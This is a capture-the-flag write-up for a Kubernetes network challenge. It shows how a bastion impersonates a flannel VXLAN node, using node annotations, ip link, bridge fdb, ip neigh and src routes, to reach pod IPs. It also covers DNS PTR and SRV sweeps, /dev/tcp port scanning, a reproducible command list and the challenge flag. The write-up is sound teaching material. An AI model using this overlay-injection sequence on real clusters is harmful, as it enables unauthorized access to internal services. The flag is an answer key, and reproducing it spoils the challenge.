# Split Horizon — CTF Writeup
## Cloud Security Championship | Challenge #11

---

## Overview

| Field | Detail |
|---|---|
| **Challenge** | Split Horizon |
| **Platform** | Cloud Security Championship (Wiz Research) |
| **Author** | Mohit Gupta / Skybound |
| **Flag** | `WIZ_CTF{packets_take_the_scenic_route}` |
| **Category** | Cloud / Kubernetes / Network |

---

## Mission

> A Kubernetes team split a sensitive diagnostics endpoint away from the normal access path after an incident review. The bastion account can see only node-level metadata. You have shell access to a bastion inside the lab. Map the network from what the nodes reveal, discover the hidden endpoint through DNS, and reach it without creating any Kubernetes resources.

The key constraint: **no `kubectl create/apply` allowed** — you cannot spin up pods, services, or any Kubernetes object to help yourself.

---

## Phase 1 — Understanding What We Have

### What the Bastion Is

The starting shell is `root@bastion` — a container on the same Docker network as the k3s cluster nodes, but **not** a Kubernetes node itself. It has no pod networking, no kube-proxy, and no flannel agent. It can see the underlay Docker bridge network (`172.30.0.0/16`), but has zero visibility into the pod overlay network (`10.42.0.0/16`) or service network (`10.43.0.0/16`).

This is the "split horizon" of the title — the bastion is on one side of the network boundary, the cluster on the other.

### RBAC: What Can the Bastion Account Do?

The first thing to check is what Kubernetes API permissions exist. Testing with `kubectl auth can-i --list` reveals:

```
get    nodes
list   nodes
```

That's it. No pods, no services, no configmaps — nothing useful to pivot from through the API. But this is **exactly what we need**: nodes expose their full metadata in annotations.

---

## Phase 2 — Node Reconnaissance

### Extracting the Network Blueprint

```bash
kubectl get nodes -o json
```

K3s annotates every node with the flannel VXLAN configuration it uses to build the overlay mesh. The critical fields per node are:

| Annotation | Meaning |
|---|---|
| `flannel.alpha.coreos.com/public-ip` | The node's underlay IP on the Docker bridge |
| `flannel.alpha.coreos.com/backend-data` | JSON containing the VTEP MAC address |
| `spec.podCIDR` | The `/24` pod subnet assigned to this node |

Extracting these revealed:

| Node | Underlay IP | Pod CIDR | VTEP MAC |
|---|---|---|---|
| `k3d-research-lab-server-0` | `172.30.0.2` | `10.42.0.0/24` | `72:6c:75:ba:48:cb` |
| `k3d-research-lab-agent-1` | `172.30.0.3` | `10.42.2.0/24` | `4a:95:90:04:46:ab` |
| `k3d-research-lab-agent-0` | `172.30.0.4` | `10.42.1.0/24` | `9e:dd:0e:f3:9b:8e` |

This is the complete wiring diagram of the overlay network — extracted entirely from the Kubernetes API with just `list nodes` permission.

### K3s Global Config

Also discoverable from node annotations:

- Flannel backend: **vxlan**, VNI=**1**, UDP port=**8472**
- Service CIDR: `10.43.0.0/16`
- Cluster DNS: `10.43.0.10` (the `kube-dns` Service VIP)

---

## Phase 3 — Understanding Flannel VXLAN

### How Flannel Works

Flannel creates a VXLAN overlay to give every pod a routable IP across nodes. The key components:

1. **`flannel.1` interface** — a Linux VXLAN device on each node. It encapsulates inner packets (from pod IPs) in UDP/VXLAN headers and sends them to the target node's underlay IP.
2. **FDB (Forwarding Database)** — maps VTEP MACs to underlay IPs. When flannel wants to reach node B's gateway, it looks up B's VTEP MAC in the FDB to know which underlay IP to send the encapsulated packet to.
3. **ARP/neighbour table** — maps pod IPs to their node's VTEP MAC. Flannel pre-populates this so packets for `10.42.1.X` get the MAC `9e:dd:0e:f3:9b:8e` (worker-1's VTEP).

The `nolearning` flag on the VXLAN device means flannel doesn't auto-learn MACs from incoming traffic — it only uses what's explicitly programmed. Importantly, **`nolearning` does not block incoming packets** from unknown sources; it only prevents the device from updating its own forwarding tables automatically.

### The Key Insight: We Can Fake a Flannel Node

Because we have all the wiring information (VTEPs, MACs, CIDRs), we can manually build the exact same VXLAN setup that flannel builds on real nodes — but on the bastion. This makes the bastion appear as a legitimate flannel participant to the k3s nodes.

---

## Phase 4 — Building the Fake VXLAN Interface

### Step 1: Create the VXLAN Interface

```bash
ip link add flannel.1 type vxlan id 1 dstport 8472 nolearning local 172.30.0.5
ip link set flannel.1 up
```

- `id 1` — VNI 1, matching the cluster's flannel VNI
- `dstport 8472` — k3s uses 8472, not the standard 4789
- `nolearning` — matches the cluster config
- `local 172.30.0.5` — bind to the bastion's underlay IP

### Step 2: FDB Entries — Teaching VXLAN Where to Send Packets

Each node's VTEP MAC needs to be associated with that node's underlay IP. When bastion sends a packet destined for e.g. `10.42.1.X`, the inner packet's destination MAC will be worker-1's VTEP MAC (`9e:dd:0e:f3:9b:8e`), and the FDB tells the VXLAN device to encapsulate it and send the UDP packet to `172.30.0.4`.

```bash
# BUM (Broadcast/Unknown Multicast) entries — default VXLAN forwarding
bridge fdb append 00:00:00:00:00:00 dev flannel.1 dst 172.30.0.2
bridge fdb append 00:00:00:00:00:00 dev flannel.1 dst 172.30.0.3
bridge fdb append 00:00:00:00:00:00 dev flannel.1 dst 172.30.0.4

# Unicast entries — VTEP MAC to underlay IP mappings
bridge fdb append 72:6c:75:ba:48:cb dev flannel.1 dst 172.30.0.2
bridge fdb append 4a:95:90:04:46:ab dev flannel.1 dst 172.30.0.3
bridge fdb append 9e:dd:0e:f3:9b:8e dev flannel.1 dst 172.30.0.4
```

### Step 3: Neighbour (ARP) Entries — Pod IPs to VTEP MACs

When the kernel needs to send a packet to e.g. `10.42.1.2`, it needs to know what Ethernet destination MAC to use inside the VXLAN frame. Each pod CIDR gateway and pod IP must be mapped to the appropriate node's VTEP MAC.

```bash
# Node 10.42.0.x → master VTEP
ip neigh add 10.42.0.0 lladdr 72:6c:75:ba:48:cb dev flannel.1 nud permanent
ip neigh add 10.42.0.1 lladdr 72:6c:75:ba:48:cb dev flannel.1 nud permanent
# ... (2 through 10 for each node)

# Node 10.42.1.x → worker-1 VTEP
ip neigh add 10.42.1.0 lladdr 9e:dd:0e:f3:9b:8e dev flannel.1 nud permanent
ip neigh add 10.42.1.2 lladdr 9e:dd:0e:f3:9b:8e dev flannel.1 nud permanent
# ...

# Node 10.42.2.x → worker-2 VTEP
ip neigh add 10.42.2.0 lladdr 4a:95:90:04:46:ab dev flannel.1 nud permanent
# ...
```

---

## Phase 5 — The Routing Problem (And Why It Took a While)

### First Attempt: iptables SNAT

The obvious approach to make bastion's packets appear to come from its own IP:

```bash
iptables -t nat -A POSTROUTING -o flannel.1 -j SNAT --to-source 172.30.0.5
ip route add 10.42.0.0/24 via 10.42.0.0 dev flannel.1 onlink
ip route add 10.42.1.0/24 via 10.42.1.0 dev flannel.1 onlink
ip route add 10.42.2.0/24 via 10.42.2.0 dev flannel.1 onlink
```

**This didn't work.** Pings to pod IPs timed out silently.

### Why SNAT Failed — The Conntrack Asymmetry Problem

This is the subtle part. Here's what happens with SNAT:

1. Bastion sends a packet to `10.42.1.2:53`
2. iptables SNAT rewrites the source from `172.30.0.5` to `172.30.0.5` (same, since bastion IS `172.30.0.5`) — actually the issue is slightly different...

The real problem: when bastion sources from a non-pod IP, the pods see the packet coming from `172.30.0.5` (underlay). They route the reply back to `172.30.0.5` via the Docker bridge — a plain L3 route through `eth0`, NOT through the VXLAN interface. 

The reply arrives at bastion via `eth0`. But conntrack was set up expecting the return via `flannel.1` (the interface where SNAT was applied). **The return traffic arrives on the wrong interface**, so conntrack can't perform the reverse NAT, and the socket never sees the reply.

This is the classic "asymmetric routing breaks stateful NAT" problem. The outbound path is `flannel.1 → VXLAN → node`, but the inbound path is `eth0 ← Docker bridge ← node`. Conntrack tracks per-interface and the state mismatch causes silent drops.

### The Fix: `src` in the Route

The correct approach (from the writeup at nerdymark.com) is to use the `src` hint in the kernel route:

```bash
ip route add 10.42.0.0/24 via 10.42.0.0 dev flannel.1 onlink src 172.30.0.5
ip route add 10.42.1.0/24 via 10.42.1.0 dev flannel.1 onlink src 172.30.0.5
ip route add 10.42.2.0/24 via 10.42.2.0 dev flannel.1 onlink src 172.30.0.5
```

**Why this works:**

The `src` parameter in an `ip route` entry is a "preferred source address" hint. When the kernel selects this route, it uses `172.30.0.5` as the source IP of the outgoing packet — **at routing time, not via NAT**. This means:

- No conntrack state is created for NAT purposes
- The inner VXLAN packet is genuinely sourced from `172.30.0.5`
- The pod receives a packet from `172.30.0.5` and routes the reply back to `172.30.0.5` via the Docker bridge (`eth0`)
- The reply arrives at bastion's `eth0` and goes straight to the socket — no NAT reversal needed, no conntrack asymmetry

The distinction: **`ip route src` is a routing policy hint (stateless), while iptables SNAT is stateful NAT**. The stateless approach has no asymmetric routing problem.

---

## Phase 6 — DNS Discovery

### The CoreDNS Problem

Cluster DNS (`10.43.0.10`) is a Kubernetes Service VIP. It works via kube-proxy iptables rules that DNAT packets to an actual CoreDNS pod. **But bastion has no kube-proxy.** Without kube-proxy's iptables rules, packets to `10.43.0.10` go nowhere — the VIP is a phantom.

### Finding Real CoreDNS Pods

Since we now have connectivity to the pod CIDR via the VXLAN interface, we can query pod IPs directly. CoreDNS pods typically live in `kube-system` and are among the first pods scheduled, so they get low IPs (`.2`, `.3`) in their node's CIDR.

Sweep all three node CIDRs by sending DNS SOA queries directly to pod IPs:

```bash
for cidr in 10.42.0 10.42.1 10.42.2; do
  for i in $(seq 2 10); do
    ip="$cidr.$i"
    ans=$(dig @$ip cluster.local SOA +short +time=1 +tries=1 2>/dev/null | head -1)
    [[ -n "$ans" ]] && [[ "$ans" != *"timed out"* ]] && echo "CoreDNS: $ip ($ans)"
  done
done
```

Result: **CoreDNS at `10.42.1.2`** (on worker-1, as expected for a 2-node worker cluster where CoreDNS lands on the first available worker).

### Sweeping the Service CIDR for the Hidden Endpoint

The challenge says a diagnostics endpoint was "split away from the normal access path." This means it has a ClusterIP service but no normal access route. DNS is the way to find it — PTR (reverse DNS) records for every IP in the service CIDR:

```bash
for i in $(seq 1 254); do
  ans=$(dig @10.42.1.2 -x 10.43.0.$i +short +time=1 +tries=1 2>/dev/null)
  [[ -n "$ans" ]] && echo "10.43.0.$i -> $ans"
done
```

Results:
```
10.43.0.1  -> kubernetes.default.svc.cluster.local.
10.43.0.10 -> kube-dns.kube-system.svc.cluster.local.
10.43.0.37 -> flag-server.target.svc.cluster.local.
```

`flag-server.target.svc.cluster.local` — there it is. The `target` namespace is the tell.

### Getting the Port via SRV Record

Kubernetes automatically creates SRV records for named service ports:

```bash
dig @10.42.1.2 SRV flag-server.target.svc.cluster.local +short
```

Output: `0 100 31337 flag-server.target.svc.cluster.local.`

Port **31337**.

---

## Phase 7 — Finding the Pod and Getting the Flag

### Why Not Just Connect to the ClusterIP?

`10.43.0.37` is a ClusterIP — it only works via kube-proxy DNAT rules on actual cluster nodes. From bastion, without kube-proxy, connecting to `10.43.0.37:31337` would hit a dead route into the service CIDR (which has no pod behind it at the IP level). We need the actual **pod IP**.

### Port Scan the Pod CIDRs

```bash
for cidr in 10.42.0 10.42.1 10.42.2; do
  for i in $(seq 2 30); do
    ip="$cidr.$i"
    timeout 1 bash -c "echo > /dev/tcp/$ip/31337" 2>/dev/null && echo "OPEN: $ip:31337"
  done
done
```

Result: **`OPEN: 10.42.1.4:31337`** — the flag server pod is on worker-1, at `10.42.1.4`.

### Retrieving the Flag

```bash
printf 'flag\n' | nc -w 3 10.42.1.4 31337
```

Output:
```
flag input: WIZ_CTF{packets_take_the_scenic_route}
```

---

## What Made This Hard

### 1. The Invisible Boundary

The bastion is physically adjacent to the cluster but logically separated. There's no error message telling you "you can't reach pods" — packets just disappear. The challenge requires knowing *why* the boundary exists (no flannel, no kube-proxy) and how to reconstruct both.

### 2. The SNAT Trap

iptables SNAT is the "obvious" solution when you need packets to appear sourced from a specific IP. It works fine for symmetric routing. The flannel VXLAN setup creates inherent asymmetric routing (out via `flannel.1`, back via `eth0`) that silently breaks SNAT. The `src` hint in routes is an elegant, stateless alternative that sidesteps conntrack entirely.

### 3. The Decoy DNS

`10.43.0.10` is advertised as cluster DNS everywhere — in the k3s config, in pod `/etc/resolv.conf`, etc. It's technically correct but **useless from the bastion** without kube-proxy. Realising this and going to find CoreDNS pods directly by IP scanning is a non-obvious pivot.

### 4. No Kubernetes Resources

The constraint forces understanding at the kernel/network level rather than the Kubernetes abstraction level. You can't `kubectl port-forward` or create a debug pod — you have to become the network yourself.

---

## Key Takeaways

| Concept | Lesson |
|---|---|
| **Flannel VXLAN internals** | Node annotations expose the complete VTEP/CIDR wiring diagram. With `ip link`, `bridge fdb`, `ip neigh`, and `ip route`, you can reconstruct the overlay from scratch. |
| **`ip route src` vs iptables SNAT** | `src` is a stateless routing hint that avoids conntrack. SNAT creates conntrack state that breaks under asymmetric routing. |
| **ClusterIP vs Pod IP** | ClusterIPs are kube-proxy magic — they only work on nodes running kube-proxy. Pod IPs are real IPs on the overlay and reachable directly. |
| **Finding CoreDNS** | DNS service VIPs are kube-proxy artifacts. To use DNS from outside the cluster, find the actual CoreDNS pod IP by probing the pod CIDR directly. |
| **SRV records** | Kubernetes creates SRV DNS records for named service ports — useful for discovering ports without API access. |

---

## Full Command Sequence (Reproducible)

```bash
# 1. Extract node topology
kubectl get nodes -o json | jq '.items[] | {
  name: .metadata.name,
  underlay: .metadata.annotations["flannel.alpha.coreos.com/public-ip"],
  vtep: (.metadata.annotations["flannel.alpha.coreos.com/backend-data"] | fromjson | .VtepMAC),
  podCIDR: .spec.podCIDR
}'

# 2. Create VXLAN interface
ip link add flannel.1 type vxlan id 1 dstport 8472 nolearning local 172.30.0.5
ip link set flannel.1 up

# 3. FDB entries (replace MACs/IPs with actual values)
bridge fdb append 00:00:00:00:00:00 dev flannel.1 dst 172.30.0.2
bridge fdb append 00:00:00:00:00:00 dev flannel.1 dst 172.30.0.3
bridge fdb append 00:00:00:00:00:00 dev flannel.1 dst 172.30.0.4
bridge fdb append 72:6c:75:ba:48:cb dev flannel.1 dst 172.30.0.2
bridge fdb append 4a:95:90:04:46:ab dev flannel.1 dst 172.30.0.3
bridge fdb append 9e:dd:0e:f3:9b:8e dev flannel.1 dst 172.30.0.4

# 4. Neighbour entries (one per pod IP range per node)
for i in $(seq 0 10); do
  ip neigh add 10.42.0.$i lladdr 72:6c:75:ba:48:cb dev flannel.1 nud permanent 2>/dev/null
  ip neigh add 10.42.1.$i lladdr 9e:dd:0e:f3:9b:8e dev flannel.1 nud permanent 2>/dev/null
  ip neigh add 10.42.2.$i lladdr 4a:95:90:04:46:ab dev flannel.1 nud permanent 2>/dev/null
done

# 5. Routes with src hint (KEY: no iptables SNAT)
ip route add 10.42.0.0/24 via 10.42.0.0 dev flannel.1 onlink src 172.30.0.5
ip route add 10.42.1.0/24 via 10.42.1.0 dev flannel.1 onlink src 172.30.0.5
ip route add 10.42.2.0/24 via 10.42.2.0 dev flannel.1 onlink src 172.30.0.5

# 6. Find CoreDNS pod IP
for cidr in 10.42.0 10.42.1 10.42.2; do
  for i in $(seq 2 10); do
    ip="$cidr.$i"
    ans=$(dig @$ip cluster.local SOA +short +time=1 +tries=1 2>/dev/null | head -1)
    [[ -n "$ans" ]] && [[ "$ans" != *"timed out"* ]] && echo "CoreDNS: $ip"
  done
done
# → CoreDNS: 10.42.1.2

# 7. PTR sweep to find hidden service
for i in $(seq 1 254); do
  ans=$(dig @10.42.1.2 -x 10.43.0.$i +short +time=1 +tries=1 2>/dev/null)
  [[ -n "$ans" ]] && echo "10.43.0.$i -> $ans"
done
# → 10.43.0.37 -> flag-server.target.svc.cluster.local.

# 8. Get port via SRV record
dig @10.42.1.2 SRV flag-server.target.svc.cluster.local +short
# → 0 100 31337 flag-server.target.svc.cluster.local.

# 9. Find pod IP
for cidr in 10.42.0 10.42.1 10.42.2; do
  for i in $(seq 2 30); do
    timeout 1 bash -c "echo > /dev/tcp/$cidr.$i/31337" 2>/dev/null && echo "OPEN: $cidr.$i:31337"
  done
done
# → OPEN: 10.42.1.4:31337

# 10. Get the flag
printf 'flag\n' | nc -w 3 10.42.1.4 31337
# → flag input: WIZ_CTF{packets_take_the_scenic_route}
```
